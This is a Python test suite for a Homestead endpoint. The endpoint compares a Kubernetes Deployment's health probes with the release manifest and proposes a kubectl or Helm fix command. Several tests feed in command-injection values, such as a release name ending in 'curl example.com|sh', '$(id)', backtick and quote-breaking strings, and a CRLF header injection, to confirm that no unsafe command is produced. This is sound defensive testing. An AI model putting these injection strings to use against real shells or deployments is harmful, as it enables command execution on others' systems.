"""Homestead's own health checks against this release's manifest (#1561).

The in-app update changes only the image, so an install keeps the readiness
and liveness probes it was installed with. Settings says when they differ from
the manifest this image carries, with the one fix that suits how Homestead was
installed, and never says they match when it could not read them.

The Deployments below have the shape the API server gives back: it fills in
failureThreshold, successThreshold and the httpGet scheme that the manifest
leaves out (read from a real cluster's Deployment, 28 Nov 2026; names neutral).
"""
import importlib
import json
import re
import shlex
import textwrap
import tempfile
import sys
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "server"))
sys.path.insert(0, str(ROOT / "tests"))
import homestead_kube as K
import homestead_routes as ROUTES
import homestead_self as SELF
import homestead_yaml as YAML
from fakes.kube import Kube

PATH = "/apis/apps/v1/namespaces/lab/deployments/homestead"
URL = "/api/self/probes"


def probe(path, delay, period, port=8080):
    """A probe as the API server stores it from the manifest's text."""
    return {"failureThreshold": 3, "httpGet": {"path": path, "port": port, "scheme": "HTTP"},
            "initialDelaySeconds": delay, "periodSeconds": period, "successThreshold": 1, "timeoutSeconds": 3}


def deployment(readiness="/readyz?check=data", labels=None, annotations=None, **container):
    spec = {"name": "homestead", "image": "ghcr.io/homestead-lab/homestead:2.9.1",
            "ports": [{"containerPort": 8080, "name": "http", "protocol": "TCP"}],
            "readinessProbe": probe(readiness, 3, 10), "livenessProbe": probe("/healthz", 15, 20),
            "terminationMessagePath": "/dev/termination-log", "imagePullPolicy": "IfNotPresent"}
    spec.update(container)
    spec = {k: v for k, v in spec.items() if v is not None}
    return {"apiVersion": "apps/v1", "kind": "Deployment",
            "metadata": {"name": "homestead", "namespace": "lab", "resourceVersion": "41",
                         "labels": {"app": "homestead", **(labels or {})}, "annotations": dict(annotations or {})},
            "spec": {"replicas": 1, "selector": {"matchLabels": {"app": "homestead"}},
                     "template": {"metadata": {"labels": {"app": "homestead"}},
                                  "spec": {"containers": [spec], "restartPolicy": "Always"}}}}


HELM = {"app.kubernetes.io/managed-by": "Helm", "app.kubernetes.io/instance": "home-lab"}
HELM_NOTES = {"meta.helm.sh/release-name": "home-lab", "meta.helm.sh/release-namespace": "lab"}


class OwnProbes(unittest.TestCase):
    def use(self, *objects, version="2.9.1"):
        self.kube = self.enterContext(Kube(*objects))
        self.addCleanup(SELF.bind, *(getattr(SELF, n, None) for n in ("kget", "ksend", "NS", "VERSION", "DATA_DIR")))
        SELF.bind(K.kget, K.ksend, "lab", version, "/data")
        return self.kube

    def route(self):
        """GET /api/self/probes as its module declares it: (role, handler)."""
        module = next((importlib.import_module(name) for name in ROUTES.MODULES if name == "homestead_self_probes"), None)
        route = getattr(module, "ROUTES", {}).get(("GET", URL))
        self.assertIsNotNone(route, f"GET {URL} is not a route")
        return route

    def ask(self):
        """What GET /api/self/probes answers."""
        role, handler = self.route()
        return handler(ROUTES.Request("GET", URL, {}, b"", "admin", role))

    def run_fix(self, command):
        """Run the shown kubectl patch the way kubectl does: a strategic merge."""
        words = shlex.split(command)
        self.assertEqual(["kubectl", "-n", "lab", "patch", "deployment", "homestead", "-p"], words[:7], command)
        self.kube("PATCH", PATH, json.loads(words[7]), "application/strategic-merge-patch+json")

    # ------------------------------------------------------------ matching
    def test_a_current_install_matches_though_the_api_filled_in_defaults(self):
        self.use(deployment())
        answer = self.ask()
        self.assertEqual("current", answer["state"], answer)
        self.assertEqual([], answer["differences"])
        self.assertNotIn("fix", answer)

    def test_a_named_port_is_the_same_port(self):
        live = deployment(livenessProbe=probe("/healthz", 15, 20, port="http"))
        self.use(live)
        self.assertEqual("current", self.ask()["state"])

    # ------------------------------------------------------------ the issue
    def test_an_install_updated_in_the_app_is_told_its_readiness_check_is_old(self):
        self.use(deployment(readiness="/healthz"))
        answer = self.ask()
        self.assertEqual("differs", answer["state"], answer)
        self.assertEqual([("readiness", "httpGet.path", "/healthz", "/readyz?check=data")],
                         [(d["probe"], d["field"], d["live"], d["wanted"]) for d in answer["differences"]])
        self.assertIn("The readiness check asks /healthz. This release asks /readyz?check=data.", answer["detail"])
        self.assertNotIn("liveness", answer["detail"])
        self.assertIn("cannot write its data", answer["effect"])
        self.assertEqual("manifest", answer["install"])
        self.assertTrue(answer["fix"]["command"].startswith("kubectl -n lab patch deployment homestead -p '"))
        self.assertIn("restarts", answer["fix"]["note"])
        self.assertIn("If another tool applies Homestead, set them there instead.", answer["fix"]["note"])

    def test_the_command_shown_brings_the_checks_in_line(self):
        kube = self.use(deployment(readiness="/healthz"))
        self.run_fix(self.ask()["fix"]["command"])
        live = kube.object(PATH)["spec"]["template"]["spec"]["containers"][0]
        self.assertEqual("/readyz?check=data", live["readinessProbe"]["httpGet"]["path"])
        self.assertEqual("ghcr.io/homestead-lab/homestead:2.9.1", live["image"], "the patch changes only the checks")
        self.assertEqual("current", self.ask()["state"])

    def test_a_timing_the_manifest_sets_is_compared(self):
        live = deployment()
        live["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]["periodSeconds"] = 30
        self.use(live)
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.assertEqual([("readiness", "periodSeconds", 30, 10)],
                         [(d["probe"], d["field"], d["live"], d["wanted"]) for d in answer["differences"]])
        self.assertNotIn("effect", answer, "only the data check's change is explained")

    def test_a_check_this_release_does_not_have_is_named_and_removed_by_the_fix(self):
        self.use(deployment(startupProbe=probe("/healthz", 0, 5)))
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.assertIn("This release has no startup check.", answer["detail"])
        self.run_fix(answer["fix"]["command"])
        self.assertEqual("current", self.ask()["state"])

    def test_a_check_this_release_adds_is_named_and_set_by_the_fix(self):
        self.use(deployment(livenessProbe=None))
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.assertIn("There is no liveness check. This release has one.", answer["detail"])
        self.run_fix(answer["fix"]["command"])
        self.assertEqual("current", self.ask()["state"])

    def test_a_check_of_another_kind_is_replaced_by_the_fix(self):
        self.use(deployment(readinessProbe={"tcpSocket": {"port": 8080}, "periodSeconds": 10, "timeoutSeconds": 1,
                                            "successThreshold": 1, "failureThreshold": 3}))
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.run_fix(answer["fix"]["command"])
        live = self.kube.object(PATH)["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]
        self.assertNotIn("tcpSocket", live, "a probe has one handler; the API refuses two")
        self.assertEqual("current", self.ask()["state"])

    # ------------------------------------------------------------ install kinds
    def test_a_helm_install_is_shown_a_helm_upgrade_not_a_patch(self):
        self.use(deployment(readiness="/healthz", labels=HELM, annotations=HELM_NOTES))
        answer = self.ask()
        self.assertEqual("helm", answer["install"])
        command = answer["fix"]["command"]
        self.assertEqual("helm upgrade home-lab oci://ghcr.io/homestead-lab/charts/homestead -n lab --version 2.9.1 "
                         "--reset-then-reuse-values --set-string image.tag= --wait --timeout 5m", command)
        self.assertNotIn("kubectl", command)
        self.assertIn("Helm", answer["fix"]["note"])

    def test_the_helm_command_takes_the_new_charts_defaults(self):
        """--reuse-values renders the new chart with the old chart's values.yaml:
        a value the chart gained since (samba, 2.8.301) is missing and the
        template fails, and the old default repository comes back. Reset-then-
        reuse takes the new defaults and keeps only what was set by hand; the
        tag is set empty, which is the chart's appVersion, because the
        documented upgrade command stored a pinned one."""
        self.use(deployment(readiness="/healthz", labels=HELM, annotations=HELM_NOTES))
        answer = self.ask()
        words = shlex.split(answer["fix"]["command"])
        self.assertIn("--reset-then-reuse-values", words)
        self.assertNotIn("--reuse-values", words)
        self.assertEqual("image.tag=", words[words.index("--set-string") + 1], "the old pin is cleared")
        self.assertIn("Needs Helm 3.14 or later.", answer["fix"]["note"])
        self.assertIn("helm get values home-lab -n lab", answer["fix"]["note"])
        self.assertIn("image repository", answer["fix"]["note"])

    def test_the_charts_checks_are_this_releases(self):
        """A Helm install is told to upgrade the chart: that only clears the
        cell if the chart's probes are the manifest's (scripts/render_chart.py
        writes them by hand)."""
        text = (ROOT / "charts" / "homestead" / "templates" / "homestead.yaml").read_text(encoding="utf-8")
        lines = text.split("\n")
        start = next(i for i, line in enumerate(lines) if line.strip() == "readinessProbe:")
        indent = len(lines[start]) - len(lines[start].lstrip())
        end = next(i for i in range(start + 1, len(lines))
                   if lines[i].strip() and len(lines[i]) - len(lines[i].lstrip()) <= indent
                   and not re.match(r"\s*(readiness|liveness|startup)Probe:", lines[i]))
        probes = YAML.loads(textwrap.dedent("\n".join(lines[start:end])))
        self.assertEqual({"readinessProbe", "livenessProbe"}, set(probes))
        self.use(deployment(labels=HELM, annotations=HELM_NOTES, readinessProbe=probes["readinessProbe"],
                            livenessProbe=probes["livenessProbe"]))
        self.assertEqual("current", self.ask()["state"])

    def test_flux_is_told_where_to_change_them_with_the_values(self):
        self.use(deployment(readiness="/healthz", labels={"kustomize.toolkit.fluxcd.io/name": "apps",
                                                           "kustomize.toolkit.fluxcd.io/namespace": "flux-system"}))
        answer = self.ask()
        self.assertEqual("managed", answer["install"])
        self.assertNotIn("command", answer["fix"])
        self.assertIn("Flux", answer["fix"]["note"])
        self.assertIn("Kustomization flux-system/apps", answer["fix"]["note"])
        values = YAML.loads(answer["fix"]["values"])
        self.assertEqual(["readinessProbe"], list(values), "only what differs")
        self.assertEqual("/readyz?check=data", values["readinessProbe"]["httpGet"]["path"])

    def test_a_chart_applied_by_flux_is_told_to_raise_the_chart_version(self):
        self.use(deployment(readiness="/healthz", labels={**HELM, "helm.toolkit.fluxcd.io/name": "homestead",
                                                           "helm.toolkit.fluxcd.io/namespace": "lab"}))
        answer = self.ask()
        self.assertEqual("managed", answer["install"])
        self.assertIn("chart version to 2.9.1", answer["fix"]["note"])
        self.assertNotIn("values", answer["fix"], "the chart has no probe values to set")
        self.assertNotIn("command", answer["fix"])

    def test_an_install_marked_as_updated_elsewhere_is_told_to_change_them_there(self):
        self.use(deployment(readiness="/healthz", annotations={"homestead.io/updates-managed": "our CI"}))
        answer = self.ask()
        self.assertEqual("managed", answer["install"])
        self.assertIn("our CI", answer["fix"]["note"])
        self.assertEqual("/readyz?check=data", YAML.loads(answer["fix"]["values"])["readinessProbe"]["httpGet"]["path"])

    # ------------------------------------------------------------ failed reads
    def test_a_deployment_that_cannot_be_read_is_not_called_a_match(self):
        kube = self.use(deployment())
        kube.fail(PATH, 403, times=9)
        answer = self.ask()
        self.assertEqual("unknown", answer["state"])
        self.assertIn("could not be read", answer["detail"])
        self.assertIn("403", answer["detail"])
        self.assertNotIn("fix", answer)

    def test_a_missing_deployment_is_not_called_a_match(self):
        self.use()
        answer = self.ask()
        self.assertEqual("unknown", answer["state"])
        self.assertIn("no Deployment named homestead", answer["detail"])

    def test_a_deployment_without_homesteads_container_is_not_called_a_match(self):
        self.use(deployment(name="app"))
        answer = self.ask()
        self.assertEqual("unknown", answer["state"])
        self.assertIn("no container named homestead", answer["detail"])

    def test_a_manifest_that_cannot_be_read_is_not_called_a_match(self):
        self.use(deployment(readiness="/healthz"))
        probe_text = (ROOT / "deploy" / "deploy.yaml").read_text(encoding="utf-8")
        not_a_map = re.sub(r"(?s)readinessProbe:\n.*?(?=\n          livenessProbe:)", "readinessProbe: x", probe_text, count=1)
        self.assertIn("readinessProbe: x\n", not_a_map)
        for text in ('kind: Deployment\nmetadata: {name: "homestead\n', "- just\n- a list\n", "plain words\n", not_a_map):
            with self.subTest(text=text[:40]), tempfile.TemporaryDirectory() as folder:
                manifest = Path(folder) / "deploy.yaml"
                manifest.write_text(text, encoding="utf-8")
                with mock.patch.object(SELF, "MANIFESTS", (str(manifest),)):
                    answer = self.ask()
                self.assertEqual("unknown", answer["state"], answer)
                self.assertIn("manifest", answer["detail"])

    def test_an_image_without_its_manifest_is_not_called_a_match(self):
        self.use(deployment(readiness="/healthz"))
        with mock.patch.object(SELF, "MANIFESTS", ("/nonexistent/deploy.yaml",)):
            answer = self.ask()
        self.assertEqual("unknown", answer["state"])
        self.assertIn("manifest", answer["detail"])

    # ------------------------------------------------------------ values a person copies
    # Labels and annotations are free text that anyone who may edit the
    # Deployment can write, and the command is pasted into a shell: a value
    # that is not a plain name gives no command at all, never another name's.
    def helm_answer(self, labels=HELM, annotations=HELM_NOTES, version="2.9.1"):
        self.use(deployment(readiness="/healthz", labels=labels, annotations=annotations), version=version)
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.assertEqual("helm", answer["install"])
        self.assertIn("The readiness check asks /healthz.", answer["detail"], "the differences are still listed")
        return answer

    def test_a_hostile_release_name_gives_no_command(self):
        answer = self.helm_answer(annotations={**HELM_NOTES, "meta.helm.sh/release-name": "home-lab; curl example.com|sh"})
        self.assertNotIn("command", answer["fix"])
        self.assertIn("The Helm release name recorded on the Deployment is not a usable name, "
                      "so the command cannot be given.", answer["fix"]["note"])
        self.assertNotIn("curl", json.dumps(answer["fix"]))

    def test_a_hostile_release_namespace_gives_no_command(self):
        answer = self.helm_answer(annotations={**HELM_NOTES, "meta.helm.sh/release-namespace": "lab$(id)"})
        self.assertNotIn("command", answer["fix"])
        self.assertIn("The Helm namespace recorded on the Deployment is not a usable name", answer["fix"]["note"])

    def test_a_hostile_instance_label_gives_no_command_and_no_other_name(self):
        answer = self.helm_answer(labels={**HELM, "app.kubernetes.io/instance": "Home_Lab"}, annotations={})
        self.assertNotIn("command", answer["fix"], "no fall back to another release's name")
        self.assertIn("release name recorded on the Deployment is not a usable name", answer["fix"]["note"])

    def test_a_release_name_too_long_for_helm_gives_no_command(self):
        answer = self.helm_answer(annotations={**HELM_NOTES, "meta.helm.sh/release-name": "a" * 54})
        self.assertNotIn("command", answer["fix"])

    def test_a_version_that_is_not_a_release_gives_no_helm_command(self):
        for version in ("2.9.1 --post-renderer ./x", "2.9.1`id`", "", "\u0662.9.1"):
            with self.subTest(version=version):
                answer = self.helm_answer(version=version)
                self.assertNotIn("command", answer["fix"])
                self.assertIn("This Homestead's version is not a release version, so the command cannot be given.",
                              answer["fix"]["note"])

    def test_a_dev_release_version_is_usable(self):
        answer = self.helm_answer(version="2.9.1-dev.4")
        self.assertIn("--version 2.9.1-dev.4 --reset-then-reuse-values", answer["fix"]["command"])

    def test_a_namespace_that_is_not_a_name_gives_no_kubectl_command(self):
        live = deployment(readiness="/healthz")
        live["metadata"]["namespace"] = "Lab_X"
        self.use(live)
        SELF.bind(K.kget, K.ksend, "Lab_X", "2.9.1", "/data")
        answer = self.ask()
        self.assertEqual("differs", answer["state"])
        self.assertNotIn("command", answer["fix"])
        self.assertIn("Homestead's namespace is not a usable name, so the command cannot be given.", answer["fix"]["note"])

    def test_a_quote_in_this_releases_probe_stays_inside_the_argument(self):
        text = (ROOT / "deploy" / "deploy.yaml").read_text(encoding="utf-8")
        self.assertIn("path: /readyz?check=data", text)
        with tempfile.TemporaryDirectory() as folder:
            manifest = Path(folder) / "deploy.yaml"
            manifest.write_text(text.replace("path: /readyz?check=data", "path: \"/readyz?check=it's'; id; '\""), encoding="utf-8")
            self.use(deployment(readiness="/healthz"))
            with mock.patch.object(SELF, "MANIFESTS", (str(manifest),)):
                command = self.ask()["fix"]["command"]
                self.assertEqual(8, len(shlex.split(command)), command)
                self.run_fix(command)
                live = self.kube.object(PATH)["spec"]["template"]["spec"]["containers"][0]["readinessProbe"]
                self.assertEqual("/readyz?check=it's'; id; '", live["httpGet"]["path"])
                self.assertEqual("current", self.ask()["state"])

    def test_cluster_text_in_the_notes_is_capped_and_has_no_control_characters(self):
        mark = "our CI\n\x1b[31mred" + "x" * 300
        self.use(deployment(readiness="/healthz\r\nX-Injected: 1", annotations={"homestead.io/updates-managed": mark}))
        answer = self.ask()
        for text in (answer["fix"]["note"], answer["detail"]):
            self.assertFalse(any(ord(ch) < 32 or ord(ch) == 127 for ch in text), repr(text))
        self.assertNotIn("x" * 100, answer["fix"]["note"])
        self.assertIn("our CI", answer["fix"]["note"])

    def test_a_failed_reads_error_is_capped_and_has_no_control_characters(self):
        kube = self.use(deployment())
        kube.fail(PATH, OSError("refused\n\x1b[2J" + "y" * 400), times=9)
        detail = self.ask()["detail"]
        self.assertFalse(any(ord(ch) < 32 for ch in detail), repr(detail))
        self.assertLess(len(detail), 260)

    # ------------------------------------------------------------ who may ask
    def test_only_an_admin_may_ask(self):
        self.assertEqual("admin", self.route()[0])

    def test_asking_writes_nothing(self):
        kube = self.use(deployment(readiness="/healthz", labels=HELM))
        self.ask()
        self.assertEqual([], kube.writes)


if __name__ == "__main__":
    unittest.main()
